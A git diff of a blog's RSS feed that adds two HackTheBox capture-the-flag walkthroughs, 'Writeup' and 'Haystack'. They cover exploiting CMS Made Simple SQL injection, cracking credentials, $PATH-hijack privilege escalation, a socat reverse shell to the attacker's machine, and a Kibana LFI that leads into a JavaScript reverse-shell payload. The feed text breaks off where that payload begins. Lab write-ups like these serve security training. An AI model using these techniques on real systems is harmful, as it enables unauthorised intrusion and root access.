@@ -5,9 +5,434 @@
     <description>A blog</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 05 Oct 2019 14:14:33 -0400</pubDate>
-    <lastBuildDate>Sat, 05 Oct 2019 14:14:33 -0400</lastBuildDate>
+    <pubDate>Sat, 12 Oct 2019 10:39:04 -0400</pubDate>
+    <lastBuildDate>Sat, 12 Oct 2019 10:39:04 -0400</lastBuildDate>
     <generator>Jekyll v4.0.0</generator>
+    
+      <item>
+        <title>Writeup (HTB)</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/writeup/infocard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ready for the writeup I wrote up of Writeup? This is the most meta box I’ve seen; the web server has walkthroughs of other HackTheBox machines, even an “early draft” of a walkthrough of itself. Although initial access is a standard “identify CMS, look up CVE” process, privilege escalation is a fun lesson on $PATH priority.&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-scan&quot;&gt;Initial scan&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# nmap 10.10.10.138 -sC -sV -oA writeup.nmap
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-30 18:12 EDT
+Nmap scan report for 10.10.10.138
+Host is up (0.062s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/writeup/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Nothing here yet.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Only SSH and HTTP are open. Let’s see what the web server has in store for us.&lt;/p&gt;
+
+&lt;h1 id=&quot;enumerating-the-web-server&quot;&gt;Enumerating the web server&lt;/h1&gt;
+
+&lt;p&gt;At http://10.10.10.138, I find a message about some DoS protection installed on the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/writeup/image1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Any of my attempts to brute-force directories is foiled by this DoS protection. Luckily, the nmap output shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; has one disallowed entry: &lt;strong&gt;/writeup/&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;| http-robots.txt: 1 disallowed entry 
+|_/writeup/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At the /writeup/ page, I find a page with links to three HackTheBox walk-throughs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/writeup/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;(Yes, I really did think I could find the solution to Writeup in the “writeup” link . . . )&lt;/p&gt;
+
+&lt;p&gt;The bottom of the page mentions that the site was not made with &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/writeup/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I take this as a hint to dig into what the site was actually built with. If you look at the source code, you’ll see that this page was created using “CMS Made Simple.”&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The copyright ends at 2019, so I can assume that the CMS is updated to at least the 2019 version as well. I google for &lt;strong&gt;“CMS Made Simple 2019 exploit”&lt;/strong&gt;—and one of the first results is an &lt;a href=&quot;https://www.exploit-db.com/exploits/46635&quot;&gt;unauthenticated SQL injection exploit&lt;/a&gt; on the Exploit Database.&lt;/p&gt;
+
+&lt;h1 id=&quot;sql-injection-exploit&quot;&gt;SQL injection exploit&lt;/h1&gt;
+
+&lt;p&gt;The script enumerates the site for a username and password hash using blind time-based SQL injection. Once the script pulls the hash, it proceeds to crack that hash with the wordlist you’ve passed in the command. rockyou does the trick.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# python exploit.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+[+] Password cracked: raykayjay9&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The uncovered credentials &lt;strong&gt;(jkr:raykayjay9)&lt;/strong&gt; can be used to SSH into the box.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# ssh jkr@10.10.10.138
+The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
+ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
+jkr@10.10.10.138's password: 
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jkr@writeup:~$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The user flag is in jkr’s home directory.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ cat user.txt
+d4e4############################&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;privilege-escalation-abusing-path&quot;&gt;Privilege escalation: Abusing $PATH&lt;/h1&gt;
+
+&lt;p&gt;This is tough to find if you’re all alone on the box (i.e., VIP users are practically on Expert mode here), but if you run &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy64&lt;/code&gt; to snoop on processes &lt;em&gt;while&lt;/em&gt; a user is SSH’ing into the box, you’ll see some interesting commands running as root (indicated by UID=0).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;2019/09/30 19:59:33 CMD: UID=0    PID=6739   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &amp;gt; /run/motd.dynamic.new 
+2019/09/30 19:59:33 CMD: UID=0    PID=6740   | run-parts --lsbsysinit /etc/update-motd.d 
+2019/09/30 19:59:33 CMD: UID=0    PID=6741   | uname -rnsom 
+2019/09/30 19:59:33 CMD: UID=0    PID=6742   | sshd: jkr [priv]  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In the first line here, we see the value of the $PATH variable. To get root on this box, you have to understand the importance of $PATH.&lt;/p&gt;
+
+&lt;p&gt;When a user runs a binary without a full path—for example, &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;/sbin/ifconfig&lt;/code&gt;—the shell looks at the leftmost directory in $PATH for an executable called &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; and runs that. If &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; can’t be found there, the shell checks next directory in the $PATH vairable, and if it fails again, the next directory, etc.&lt;/p&gt;
+
+&lt;p&gt;Based on the third line of the &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy64&lt;/code&gt; output above, we know root runs &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; &lt;em&gt;without the full path&lt;/em&gt; every time a user SSH’s into the box. &lt;strong&gt;So if we can create our own &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; binary and place it earlier in $PATH, we can trigger root to execute the command by simply SSH’ing into the box.&lt;/strong&gt; But first, I need to verify a couple of things, such as: Where even is the &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; binary located?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ whereis uname
+uname: /bin/uname /usr/share/man/man1/uname.1.gz&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It’s in /bin, which is the rightmost directory in $PATH. So if we drop our custom &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; binary in any other directory in $PATH, that binary will execute instead of the /bin/uname binary. We need write access to this directory though, so I check to see what privileges I have over /usr/local/sbin.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ ls -alt /usr/local
+total 64
+drwx-wsr-x  2 root staff 12288 Sep 30 20:33 sbin
+drwxrwsr-x  4 root staff  4096 Apr 24 13:13 lib
+drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
+drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
+lrwxrwxrwx  1 root staff     9 Apr 19 04:11 man -&amp;gt; share/man
+drwx-wsr-x  2 root staff 20480 Apr 19 04:11 bin
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 etc
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 include
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 games
+drwxr-xr-x 10 root root   4096 Apr 19 04:11 ..&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Anyone in the &lt;strong&gt;staff&lt;/strong&gt; group can write to the /usr/local/sbin directory. I run &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; to see if jkr is part of this group.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ id
+uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So we should be good! I move to /usr/local/sbin and create the new &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; file with &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;. My script (below) simply grabs the root flag, moves it to the /tmp folder, and grants everyone read/write/execute permissions over it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /root/root.txt /tmp
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;777 /tmp/root.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I make my file executable.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:/usr/local/sbin$ chmod +x uname&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now all that’s left is triggering root’s execution of &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt;. To do this, I exit my SSH session and initiate a new one.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:/usr/local/sbin$ exit
+logout
+Connection to 10.10.10.138 closed.
+root@kali:~# ssh jkr@10.10.10.138
+jkr@10.10.10.138's password: 
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Sep 30 20:27:06 2019 from 10.10.14.31
+jkr@writeup:~$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I check the /tmp folder, and the root flag is there.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ cat /tmp/root.txt
+eeba############################&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;bonus-root-shell&quot;&gt;Bonus: Root shell&lt;/h1&gt;
+
+&lt;p&gt;To get a root shell, just turn the &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; binary into a reverse shell payload. The only roadblock is that &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ncat&lt;/code&gt; aren’t on the machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ whereis nc
+nc:
+jkr@writeup:~$ whereis netcat
+netcat:
+jkr@writeup:~$ whereis ncat
+ncat:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I &lt;em&gt;could&lt;/em&gt; download the netcat binary from my Kali box, but it’s quieter to live off the land and use tools already provided on the box. &lt;code class=&quot;highlighter-rouge&quot;&gt;socat&lt;/code&gt; works as a solid alternative.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:~$ whereis socat
+socat: /usr/bin/socat /usr/share/man/man1/socat.1.gz&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I use &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt; to create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; binary that initiates a socat reverse shell. Here’s the script:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+socat &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;'bash -li'&lt;/span&gt;,pty,stderr,setsid,sigint,sane tcp:10.10.14.31:443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I make it executable as well.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:/usr/local/sbin$ chmod +x uname&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Before triggering the command, I set up a socat listener on my Kali’s port 443.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;I exit and re-enter the SSH session to trigger the &lt;code class=&quot;highlighter-rouge&quot;&gt;uname&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;jkr@writeup:/usr/local/sbin$ exit
+logout
+Connection to 10.10.10.138 closed.
+root@kali:~# ssh jkr@10.10.10.138                                                                                                                                                              
+jkr@10.10.10.138's password:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And my listener has a root shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:443
+root@writeup:/# whoami
+root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Sat, 12 Oct 2019 08:00:00 -0400</pubDate>
+        <link>http://localhost:4000/writeup/2019/10/12/writeup-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/writeup/2019/10/12/writeup-writeup/</guid>
+        
+        <category>hackthebox</category>
+        
+        <category>writeup</category>
+        
+        <category>walkthrough</category>
+        
+        
+        <category>writeup</category>
+        
+      </item>
+    
+      <item>
+        <title>Haystack</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/haystack/infocard.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Haystack shouldn’t be ranked easy. It involves some CTF-ish searching around, researching the ELK (Elasticsearch-Logstash-Kibana) stack, understanding Grok, and using two different exploits to escalate privileges. I didn’t anticipate how much work would be involved, but I still really enjoyed this box.&lt;/p&gt;
+
+&lt;h1 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h1&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Haystack# nmap 10.10.10.115 -sV -sC -oA haystack.nmap
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 19:20 EDT
+Nmap scan report for 10.10.10.115
+Host is up (0.24s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: 502 Bad Gateway
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 66.39 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;When I visit port 80 in a browser, I get a webpage with nothing but needle.jpg.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When I visit port 9200, I find an elasticsearch service.&lt;/p&gt;
+
+&lt;p&gt;FIND IMAGE OF ELASTICSEARCH&lt;/p&gt;
+
+&lt;p&gt;To get user credentials, we need to dig into both of these ports.&lt;/p&gt;
+
+&lt;h1 id=&quot;elasticsearch&quot;&gt;Elasticsearch&lt;/h1&gt;
+
+&lt;p&gt;To understand how to use Elasticsearch, I consulted the official &lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/6.1/&quot;&gt;reference guide&lt;/a&gt;. The gist of it is that you can search through a database using GET requests via either 1) the RESTful URL or 2) cURL with a JSON body. Everything here was simple enough to only leverage the first technique.&lt;/p&gt;
+
+&lt;p&gt;First I dumped all the indices available by visiting http://10.10.10.115:9200/_cat/indices?v .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I checked bank and .kibana, but in the end, the only useful one was quotes. It’s full of . . . Spanish . . .&lt;/p&gt;
+
+&lt;p&gt;FIND IMAGE OF VIEWING ALL SPANISH QUOTES&lt;/p&gt;
+
+&lt;p&gt;An easy way to sift through everything is to query a search for the entire quotes database—and then use your browser’s native Ctrl + F functionality. So I use “size=253” to search for all 253 entries in the URL http://10.10.10.115:9200/quotes/_search?q=*&amp;amp;size=253. Here’s an example of searching for needle:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Queries for “password”, “username”, and other variants result in dead ends. So clearly there’s something else on the box I need before I can even know what I’m searching for.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-needle-in-the-haystack&quot;&gt;The needle in the haystack&lt;/h1&gt;
+
+&lt;p&gt;Back on Port 80, we had that weird JPG of a needle. There’s nothing else in the source HTML of the page—and no results from fuzzing directories—but that port has to be good for &lt;em&gt;something&lt;/em&gt;. So I run some steganography tools on the image. &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; reveals some peculiar base64.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Haystack# strings needle.jpg           
+JFIF                                      
+Exif                                                                     
+paint.net 4.1.1                                      
+UNICODE
+$3br
+%&amp;amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+        #3R
+&amp;amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+sc,x
+O9 x?
+Lg9$
+&amp;lt;!-- snip --!&amp;gt;
+BN2I
+,'*'
+I$f2/&amp;lt;-iy
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Using CyberChef, the base64 decodes to:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In English: &lt;em&gt;the needle in the haystack is “clave”.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Back on my Elasticsearch query (for all entries in the quotes database), I search for clave and find two results.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first base64 reveals a password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The second shows the username.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I use the credentials to SSH in.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;root@kali:~/HTB/Haystack# ssh security@10.10.10.115
+security@10.10.10.115's password: 
+Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
+[security@haystack ~]$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And I can grab the user flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[security@haystack ~]$ cat user.txt
+04d18bc79dac1d4d48ee0a940c8eb929&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;kibana-lfi&quot;&gt;Kibana LFI&lt;/h1&gt;
+
+&lt;p&gt;To fully understand this box and how to exploit it, you have to research the ELK stack, which includes Elasticsearch, Logstash, and Kibana. There’s a lot to dig through on this machine, but if you run LinEnum, you’ll find:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;There’s a service user called kibana.&lt;/li&gt;
+  &lt;li&gt;Port 5601 (kibana) is open to localhost (but not to the outside world).&lt;/li&gt;
+  &lt;li&gt;A kibana binary exists.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I find the version of kibana.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[security@haystack /]$ /usr/share/kibana/bin/kibana --version
+6.4.2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you search for exploits of this kibana version—or, honestly, if you search for popular Elasticsearch exploits—you’ll come across an LFI in the Kibana visualizer. There are a lot of references in places like VulDB and CVE, but the best step-by-step description I could find was from &lt;a href=&quot;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&quot;&gt;CyberArk&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In short, if you have access to the Kibana dashboard, you can use an LFI to trigger a JavaScript reverse shell payload.&lt;/p&gt;
+
+&lt;p&gt;The problem is, we don’t have access to this Kibana page, which normally runs on port 5601. I know that it’s running internally on the box though, so I forward the port over to my Kali box.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[security@haystack ~]$ ssh -R 9000:localhost:5601 root@10.10.14.31&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;To break down the syntax, I’m remotely forwarding port 9000 on my Kali box to port 5601 on the victim. So if I visit 127.0.0.1:9000 on my Kali’s web browser, I can access the Kibana dashboard.&lt;/p&gt;
+
+&lt;p&gt;SHOW IMAGE OF KIBANA DASHBOARD&lt;/p&gt;
+
+&lt;p&gt;Per the article, this URL should work: http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;amp;apis=es_6_0&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/haystack/image8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This executes es_6_0.js, which can be found in this directory:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot; data-lang=&quot;plaintext&quot;&gt;[security@haystack ~]$ ls /usr/share/kibana/src/core_plugins/console/api_server
+api.js  echo.js  es_6_0  es_6_0.js  server.js  spec&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortunately, I couldn’t get other LFIs to work (such as viewing /etc/passwd). The CyberArk article seemed to imply you could only verify the results of a non-js LFI by viewing the logs, which the security user doesn’t seem to have access to.&lt;/p&gt;
+
+&lt;p&gt;So instead of working my way up, I went for reverse shell off the bat. I find a JavaScript shell from &lt;a href=&quot;https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/&quot;&gt;https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/&lt;/a&gt;:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
